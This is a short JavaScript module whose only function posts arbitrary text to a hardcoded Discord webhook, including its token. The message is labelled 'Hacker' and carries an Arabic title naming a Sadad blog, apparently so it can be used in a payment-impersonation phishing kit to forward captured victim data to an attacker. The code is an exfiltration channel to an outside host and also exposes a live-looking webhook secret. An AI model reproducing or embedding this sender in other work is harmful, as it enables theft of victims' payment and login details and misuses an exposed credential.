import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325544865244909688/ld78ADI5fhi27mLaneD307hMRrQCt1C4sJnZNkvowc1_VFgljlLEScTTiN0HoPCPQYXs",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
